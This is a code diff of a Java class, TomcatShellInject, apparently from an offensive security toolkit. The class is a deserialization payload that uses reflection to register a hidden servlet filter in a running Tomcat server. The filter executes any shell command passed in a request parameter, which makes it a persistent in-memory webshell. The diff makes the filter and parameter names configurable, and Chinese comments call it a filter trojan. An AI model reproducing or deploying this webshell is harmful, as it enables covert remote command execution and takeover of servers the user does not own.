@@ -19,6 +19,16 @@ import javax.servlet.ServletResponse;
  */
 public class TomcatShellInject extends AbstractTranslet implements Filter {
 
+    /**
+     * webshell命令参数名
+     */
+    private final String cmdParamName = "ppppp";
+    /**
+     * 建议针对相应业务去修改filter过滤的url pattern
+     */
+    private final static String filterUrlPattern = "/*";
+    private final static String filterName = "xxxxx";
+
     static {
         try {
             /*shell注入，前提需要能拿到request、response等*/
@@ -32,7 +42,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                 javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
                 org.apache.catalina.core.StandardContext standardContext = null;
                 //判断是否已有该名字的filter，有则不再添加
-                if (servletContext.getFilterRegistration("threedr3am") == null) {
+                if (servletContext.getFilterRegistration(filterName) == null) {
                     //遍历出标准上下文对象
                     for (; standardContext == null; ) {
                         java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
@@ -54,7 +64,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                         Filter threedr3am = new TomcatShellInject();
                         //添加filter马
                         javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
-                            .addFilter("threedr3am", threedr3am);
+                            .addFilter(filterName, threedr3am);
                         filterRegistration.setInitParameter("encoding", "utf-8");
                         filterRegistration.setAsyncSupported(false);
                         filterRegistration
@@ -76,7 +86,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                             org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext
                                 .findFilterMaps();
                             for (int i = 0; i < filterMaps.length; i++) {
-                                if (filterMaps[i].getFilterName().equalsIgnoreCase("threedr3am")) {
+                                if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
                                     org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                                     filterMaps[i] = filterMaps[0];
                                     filterMaps[0] = filterMap;
@@ -114,7 +124,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
         System.out.println(
             "TomcatShellInject doFilter.....................................................................");
         String cmd;
-        if ((cmd = servletRequest.getParameter("threedr3am")) != null) {
+        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
             Process process = Runtime.getRuntime().exec(cmd);
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                 new java.io.InputStreamReader(process.getInputStream()));
